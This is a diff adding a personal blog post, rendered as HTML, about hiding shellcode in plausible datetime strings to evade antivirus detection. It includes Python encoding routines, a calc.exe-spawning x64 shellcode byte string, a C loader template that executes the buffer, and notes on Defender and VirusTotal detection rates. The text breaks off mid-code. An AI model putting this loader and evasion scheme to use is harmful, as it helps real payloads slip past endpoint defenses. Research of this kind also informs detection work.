@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Obfuscating Shellcode in Datetime fields | Journal of Connar</title>
+<meta name="keywords" content="shellcode, obfuscation">
+<meta name="description" content="Introduction
+After reading about various shellcode obfuscation techniques, such as IPv4 encoding (used in the Hive ransomware), IPv6 payload embedding, MAC address encoding, and UUID-based schemes - amongst others - I began asking myself a question: what other valid-looking formats could be used to stealthily hide shellcode?
+Most of these formats convert bytes directly to decimal or hexadecimal values and insert them into known structures. For instance, IPv4 offers minimal obfuscation beyond base conversion to decimal. IPv6 offers more space (as it can hide more bytes) but is often used in a straightforward way, directly injecting the hex bytes in the address, without any  meaningful transformation.">
+<meta name="author" content="connar">
+<link rel="canonical" href="http://localhost:1313/posts/customshellcodeloader/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.1665878c578779cd11d4dc626b2c0e032a8b9c1dcf7d37f819200b4bc208b6a7.css" integrity="sha256-FmWHjFeHec0R1NxiaywOAyqLnB3PfTf4GSALS8IItqc=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/customshellcodeloader/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Journal of Connar (Alt + H)">Journal of Connar</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/mychallenges/" title="My Challenges">
+                    <span>My Challenges</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/training/" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Obfuscating Shellcode in Datetime fields
+    </h1>
+    <div class="post-meta">10 min&nbsp;·&nbsp;connar
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
+                <li>
+                    <a href="#chosen-shellcode-format" aria-label="Chosen shellcode format">Chosen shellcode format</a></li>
+                <li>
+                    <a href="#overall-tool-execution-diagram" aria-label="Overall tool execution diagram">Overall tool execution diagram</a><ul>
+                        
+                <li>
+                    <a href="#encoding-process" aria-label="Encoding Process">Encoding Process</a><ul>
+                        
+                <li>
+                    <a href="#1-shellcode-to-32-bit-binary" aria-label="1. Shellcode to 32-bit Binary">1. Shellcode to 32-bit Binary</a></li>
+                <li>
+                    <a href="#2-partitioning-bits-into-datetime-fields" aria-label="2. Partitioning Bits into Datetime Fields">2. Partitioning Bits into Datetime Fields</a></li></ul>
+                </li>
+                <li>
+                    <a href="#obfuscating-and-field-mapping" aria-label="Obfuscating and Field Mapping">Obfuscating and Field Mapping</a><ul>
+                        
+                <li>
+                    <a href="#obfuscation-stages" aria-label="Obfuscation stages">Obfuscation stages</a><ul>
+                        
+                <li>
+                    <a href="#xor-fields" aria-label="XOR Fields">XOR Fields</a></li></ul>
+                </li>
+                <li>
+                    <a href="#obfuscation-fields" aria-label="Obfuscation fields">Obfuscation fields</a><ul>
+                        
+                <li>
+                    <a href="#hour" aria-label="Hour">Hour</a></li>
+                <li>
+                    <a href="#minute" aria-label="Minute">Minute</a></li>
+                <li>
+                    <a href="#second" aria-label="Second">Second</a></li>
+                <li>
+                    <a href="#day" aria-label="Day">Day</a></li>
+                <li>
+                    <a href="#month" aria-label="Month">Month</a></li>
+                <li>
+                    <a href="#year" aria-label="Year">Year</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#decoding-process" aria-label="Decoding Process">Decoding Process</a></li>
+                <li>
+                    <a href="#detection-rates" aria-label="Detection rates">Detection rates</a><ul>
+                        
+                <li>
+                    <a href="#having-the-shellcode-hardcoded" aria-label="Having the shellcode hardcoded">Having the shellcode hardcoded</a></li>
+                <li>
+                    <a href="#parsing-the-shellcode-from-datetime-strings" aria-label="Parsing the shellcode from datetime strings">Parsing the shellcode from datetime strings</a></li></ul>
+                </li>
+                <li>
+                    <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h1>
+<p>After reading about various shellcode obfuscation techniques, such as <code>IPv4</code> encoding (used in the Hive ransomware), <code>IPv6</code> payload embedding, <code>MAC</code> address encoding, and <code>UUID</code>-based schemes - amongst others - I began asking myself a question: <em>what other valid-looking formats could be used to stealthily hide shellcode?</em></p>
+<p>Most of these formats convert bytes directly to decimal or hexadecimal values and insert them into known structures. For instance, <code>IPv4</code> offers minimal obfuscation beyond base conversion to decimal. <code>IPv6</code> offers more space (as it can hide more bytes) but is often used in a straightforward way, directly injecting the hex bytes in the address, without any  meaningful transformation.</p>
+<p>Maybe this was the intended goal afterall, like a quick way of getting the bytes from these formats and executing them with minimum convertions and convertion algorithms. But I wanted something different — something that wouldn’t just store bytes in a format, but that would actively transform and obfuscate them in the process. At the same time, the resulting string should remain plausible, syntactically valid, and low in entropy.</p>
+<p><em>Achieving low entropy would lower the detection rate since many detection engines flag high-entropy strings as suspicious, but formats like datetime stamps (<strong>spoil</strong>) — especially when filled with consistent structure and metadata blend into them (<strong>bonus spoil</strong>).</em></p>
+<h1 id="chosen-shellcode-format">Chosen shellcode format<a hidden class="anchor" aria-hidden="true" href="#chosen-shellcode-format">#</a></h1>
+<p>After exploring a range of such valid formats, the one that got me excited the most was <code>datetime strings</code>. These offer multiple fields (like <em>hour, minute, second, year, month, day</em>), each with well-defined numeric limits, <strong>allowing 32 bits of shellcode to be spread across them</strong> (not much, but it gets the job done).<br>
+Additionally, by applying reversible <code>XOR</code> transformations and attaching metadata (such as a Region label), I could ensure that the obfuscation was not only effective in leading to valid datetime strings, but also recoverable through a decoding process.</p>
+<p>In this steganographic technique, <strong>each 4-byte block of shellcode (32 bits) is hidden inside a datetime string</strong>.<br>
+For example, the 4-byte pair <code>b'\xc2\x89\xc3\xa2</code> would be hidden in the following string:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-mathematica" data-lang="mathematica"><span style="display:flex;"><span>Thursday, <span style="color:#ae81ff">08</span><span style="color:#f92672">/</span><span style="color:#ae81ff">17</span><span style="color:#f92672">/</span><span style="color:#ae81ff">2028</span> <span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">52</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">27</span> PM UTC <span style="color:#f92672">|</span> Region<span style="color:#f92672">=</span>AFRICA_EAST
+</span></span></code></pre></div><p>How awesome is that:D</p>
+<p>The method works by converting the shellcode into a binary representation, partitioning the bits into segments assigned to datetime fields, and applying lightweight and reversible obfuscation to these values.</p>
+<p>For the deobfuscation process, the reverse operations are followed, which are guided by metadata strings used during the obfuscation.</p>
+<h1 id="overall-tool-execution-diagram">Overall tool execution diagram<a hidden class="anchor" aria-hidden="true" href="#overall-tool-execution-diagram">#</a></h1>
+<p>So, before diving into explaining the steps of the obfuscator, keep as a reference the following <code>execution flow</code> of what the tool basically does:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/flowgraph.png" alt=""  />
+</p>
+<p>This basically depicts my idea and the steps that are followed. If you are curious of what the step regarding the <code>.c</code> code is about, basically <em>I used python to automate template generation of a shellcode loader written in <code>.c</code></em> containing only the deobfuscation algorithm, the obfuscated shellcode and the execution of it, so anyone can just plug n play with it.</p>
+<p>Keep it as reference when you are looking into the description of each step.</p>
+<h2 id="encoding-process">Encoding Process<a hidden class="anchor" aria-hidden="true" href="#encoding-process">#</a></h2>
+<h3 id="1-shellcode-to-32-bit-binary">1. Shellcode to 32-bit Binary<a hidden class="anchor" aria-hidden="true" href="#1-shellcode-to-32-bit-binary">#</a></h3>
+<p>We begin by accepting a 4-byte shellcode input (since we can only hide 4 bytes), such as <code>b'\xD3\x8F\x22\xAB'</code>. If there are not sufficient number of bytes to create a 4-byte pair, we pad with null bytes.<br>
+A 4-byte pair is basically a 32-bit integer and is then converted to its binary string representation. The reason is to assign a number of bits into datetime fields used as placeholders.</p>
+<p><strong>Example</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>bytecode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xD3\x8F\x22\xAB</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>bit_str  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;11010011100011110010001010101011&#39;</span>
+</span></span></code></pre></div><h3 id="2-partitioning-bits-into-datetime-fields">2. Partitioning Bits into Datetime Fields<a hidden class="anchor" aria-hidden="true" href="#2-partitioning-bits-into-datetime-fields">#</a></h3>
+<p>The 32-bit string is divided into <code>six segments</code>, each corresponding to a datetime component:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: left">Field</th>
+          <th style="text-align: left">Bits</th>
+          <th style="text-align: left">Range</th>
+          <th style="text-align: left">Bit String Segment  (based on previous example)</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: left">Hour</td>
+          <td style="text-align: left">5</td>
+          <td style="text-align: left">[0,&hellip;,23]</td>
+          <td style="text-align: left"><code>11010</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Minute</td>
+          <td style="text-align: left">6</td>
+          <td style="text-align: left">[0,&hellip;,59]</td>
+          <td style="text-align: left"><code>011000</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Second</td>
+          <td style="text-align: left">6</td>
+          <td style="text-align: left">[0,&hellip;,59]</td>
+          <td style="text-align: left"><code>111100</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Day</td>
+          <td style="text-align: left">5</td>
+          <td style="text-align: left">[1,&hellip;,30]</td>
+          <td style="text-align: left"><code>10001</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Month</td>
+          <td style="text-align: left">4</td>
+          <td style="text-align: left">[1,&hellip;,12]</td>
+          <td style="text-align: left"><code>0100</code></td>
+      </tr>
+      <tr>
+          <td style="text-align: left">Year</td>
+          <td style="text-align: left">6</td>
+          <td style="text-align: left">[1990,&hellip;,(bits+1990)]</td>
+          <td style="text-align: left"><code>010101</code></td>
+      </tr>
+  </tbody>
+</table>
+<p>The assignment of the corresponding bits to the variables can be seen below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    raw_hour   <span style="color:#f92672">=</span> int(bits[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    raw_minute <span style="color:#f92672">=</span> int(bits[<span style="color:#ae81ff">5</span>:<span style="color:#ae81ff">11</span>], <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    raw_second <span style="color:#f92672">=</span> int(bits[<span style="color:#ae81ff">11</span>:<span style="color:#ae81ff">17</span>], <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    raw_day    <span style="color:#f92672">=</span> int(bits[<span style="color:#ae81ff">17</span>:<span style="color:#ae81ff">22</span>], <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    raw_month  <span style="color:#f92672">=</span> int(bits[<span style="color:#ae81ff">22</span>:<span style="color:#ae81ff">26</span>], <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>    raw_year   <span style="color:#f92672">=</span> int(bits[<span style="color:#ae81ff">26</span>:<span style="color:#ae81ff">32</span>], <span style="color:#ae81ff">2</span>)
+</span></span></code></pre></div><h2 id="obfuscating-and-field-mapping">Obfuscating and Field Mapping<a hidden class="anchor" aria-hidden="true" href="#obfuscating-and-field-mapping">#</a></h2>
+<p>After we have assigned the bits to the corresponding fields (variables), each field undergoes transformations to ensure it produces valid datetime values while hiding the true bit values. These transformations are either arithmetic through an equation math system:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># We embed GMT/UTC to know if a system equation was applied or not. Useful in the decoding phase</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">obfuscate_time</span>(hour, minute, second):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hour<span style="color:#f92672">+</span>minute)<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">23</span> <span style="color:#f92672">and</span> (minute<span style="color:#f92672">+</span>second)<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">59</span> <span style="color:#f92672">and</span> (second<span style="color:#f92672">+</span>hour)<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">59</span>:
+</span></span><span style="display:flex;"><span>        hour_new <span style="color:#f92672">=</span> hour<span style="color:#f92672">+</span>minute
+</span></span><span style="display:flex;"><span>        minute_new <span style="color:#f92672">=</span> minute<span style="color:#f92672">+</span>second
+</span></span><span style="display:flex;"><span>        second_new <span style="color:#f92672">=</span> second<span style="color:#f92672">+</span>hour
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> hour_new, minute_new, second_new, <span style="color:#e6db74">&#34;GMT&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> hour, minute, second, <span style="color:#e6db74">&#34;UTC&#34;</span>
+</span></span></code></pre></div><p>and/or just XOR with a threshold value:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># We create a bitarray, where bit 1 means we applied XOR on the specific field (e.g., hour), 0 means we did not. Based on the final bit array, we will embed the corresponding Region metadata. Useful in the decoding phase</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_if_needed</span>(value, limit_min, limit_max, xor_val):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">nonlocal</span> xor_bits
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> value<span style="color:#f92672">&lt;=</span>limit_min <span style="color:#f92672">or</span> value <span style="color:#f92672">&gt;=</span> limit_max:
+</span></span><span style="display:flex;"><span>        xor_bits <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> value <span style="color:#f92672">^</span> xor_val
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        xor_bits <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;0&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> value
+</span></span></code></pre></div><p>In the decoding phase, the embedded metadata will be infered to know how to decode the bits. For example, if <code>&quot;GMT&quot;</code> exists in the datetime string, the decoder will know it has to solve the math equation system.</p>
+<h3 id="obfuscation-stages">Obfuscation stages<a hidden class="anchor" aria-hidden="true" href="#obfuscation-stages">#</a></h3>
+<h4 id="xor-fields">XOR Fields<a hidden class="anchor" aria-hidden="true" href="#xor-fields">#</a></h4>
+<p>First of all, we will be xoring each field with a corresponding threshold value as mentioned before, to ensure that the final values remain within <strong>realistic fields</strong>. For example, <code>0 &lt; hour &lt; 23</code>. We cannot have as hour the value 25.</p>
+<p>Thus, as threshold, the median value (if applicable) of each field&rsquo;s max value is used. If a <code>XOR</code> takes place, we create a bitarray that will later be used to append a <code>Region</code> field. This <code>Region</code> field which is added as metadata will be used in the decryption process to know based on whether bit is <strong>1 (XOR was applied)</strong> or bit is <strong>0 (XOR was not applied)</strong> if the reverse action must be made.</p>
+<p>A further obfuscation step is made, that combines both the hour, the minutes and the seconds. Basically, I create a <code>3 equation math system</code> where <code>hour' = hour+minutes</code>, <code>minutes' = minutes + seconds</code>, <code>seconds' = seconds + minutes</code>. For this to take place though, the combination of all 3 additions must be within their specific range (e.g., hour+minutes might result in the number 57, which cannot obviously be used as a valid new hour value). If the scheme can apply, we append as extra metadata the value <code>&quot;GMT&quot;</code>, else we use the value <code>&quot;UTC&quot;</code> to know in the deobfuscation phase whether the system must be solved or not.</p>
+<p>In general, the valid values for each field are contained in <code>(min,..,max)</code>, where min and max cannot be used.</p>
+<h3 id="obfuscation-fields">Obfuscation fields<a hidden class="anchor" aria-hidden="true" href="#obfuscation-fields">#</a></h3>
+<h4 id="hour">Hour<a hidden class="anchor" aria-hidden="true" href="#hour">#</a></h4>
+<p><strong>Original value (0-24)</strong>: To fit within the 23-hour range, the hour field is <code>XORed</code> with <code>threshold = max/2 = 24/2 = 12</code>.</p>
+<h4 id="minute">Minute<a hidden class="anchor" aria-hidden="true" href="#minute">#</a></h4>
+<p><strong>Original value (0-60)</strong>: To fit within the 59-minute range, the hour field is <code>XORed</code> with <code>threshold = max/2 = 60/2 = 30</code>.</p>
+<h4 id="second">Second<a hidden class="anchor" aria-hidden="true" href="#second">#</a></h4>
+<p><strong>Original value (0-60)</strong>: Similar to minute, the same applies to second.</p>
+<h4 id="day">Day<a hidden class="anchor" aria-hidden="true" href="#day">#</a></h4>
+<p><strong>Original value (0–31)</strong>: Days must be in the range 1–31, <strong>but to avoid checking candelar months</strong> (<em>to do additional checks on whther a month can be 31 or at max 30</em>), we avoid using 31 at all. So to fit within the 30-days range, the day field is <code>XORed</code> with <code>threshold = max/2 = 30/2 = 15</code>.</p>
+<h4 id="month">Month<a hidden class="anchor" aria-hidden="true" href="#month">#</a></h4>
+<p><strong>Original value (0–13)</strong>: To comply with valid months (1–12), same logic is followed.</p>
+<h4 id="year">Year<a hidden class="anchor" aria-hidden="true" href="#year">#</a></h4>
+<p><strong>Original value (N/A)</strong>: For the year, there is no specific constrain, besides not very big values like 2800 or small values like 1500, so I used as <strong>year base</strong> the year 1990 (cause I love nineties) and since year is only 2^6, the maximum year number we might get is 1990+2^6 = 1990 + 64, which is fine.</p>
+<h2 id="decoding-process">Decoding Process<a hidden class="anchor" aria-hidden="true" href="#decoding-process">#</a></h2>
+<p>The decoder reverses each transformation in strict order, guided by the Region metadata. We start recovering our bits by starting to reverse the operations that took place starting from the last one and moving towards the first one (basically follow the flow graph from end to start).<br>
+Each field is transformed back to its original binary string, and then all the bits are concatenated and converted back into bytes.</p>
+<p>Let&rsquo;s review a demo of the final script:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/demo.png" alt=""  />
+</p>
+<p>we see that everything works as planned and we get our original shellcode after the decoding phase.<br>
+Now it is time for some actual shellcode execution and detection rate evaluation:D</p>
+<h2 id="detection-rates">Detection rates<a hidden class="anchor" aria-hidden="true" href="#detection-rates">#</a></h2>
+<h3 id="having-the-shellcode-hardcoded">Having the shellcode hardcoded<a hidden class="anchor" aria-hidden="true" href="#having-the-shellcode-hardcoded">#</a></h3>
+<p>Just to see what the Windows Defender thinks of the calc.exe spawning shellcode, I hardcoded it to my script, passing it as a formatted string when the <code>.c</code> template is being written:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>original <span style="color:#f92672">=</span> b<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>formatted_shellcode <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">&#39;&#39;</span>.<span style="color:#a6e22e">join</span>([f<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x{byte:02x}&#34;</span> <span style="color:#66d9ef">for</span> byte in original])
+</span></span><span style="display:flex;"><span>formatted_shellcode <span style="color:#f92672">=</span> formatted_shellcode.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;\\</span><span style="color:#e6db74">&#34;&#39;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>formatted_shellcode <span style="color:#f92672">=</span> formatted_shellcode.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">&#39;&#34;&#39;</span>, <span style="color:#960050;background-color:#1e0010">&#39;\\</span><span style="color:#e6db74">&#34;&#39;)</span>
+</span></span><span style="display:flex;"><span>shellcode_str_len <span style="color:#f92672">=</span> <span style="color:#a6e22e">len</span>(formatted_shellcode) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ========= Use f-string template =========
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>c_code <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#34;&#34;&#34;#define _CRT_SECURE_NO_WARNINGS</span>
+</span></span><span style="display:flex;"><span>... more c formatted code...
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> shellcode_str[{shellcode_str_len}] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{formatted_shellcode}&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Shellcode string: %s</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, shellcode_str);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>run)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span>(<span style="color:#f92672">*</span>)())shellcode_str;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">run</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span></code></pre></div><p>After running my python code, I immediately got notified by Windows defender and the executable got deleted:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/shellcode_hardcoded_wd.png" alt=""  />
+</p>
+<p>Also uploading to VT to get a detection rate, we can see it got detected by 26 engines, which is really bad:</p>
+<p><img loading="lazy" src="/posts/customshellcodeloader/VT_hardcoded_shellcode.png" alt=""  />
+</p>
+<h3 id="parsing-the-shellcode-from-datetime-strings">Parsing the shellcode from datetime strings<a hidden class="anchor" aria-hidden="true" href="#parsing-the-shellcode-from-datetime-strings">#</a></h3>
+<p>Now it is time to actually test my shellcode loader instead of hardcoding the shellcode. I will be using the following code to load the shellcode as it gets decoded:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">size_t</span> recovered_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(recovered);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;unsigned char shellcode[] = {{</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">size_t</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> recovered_len; i<span style="color:#f92672">++</span>) {{
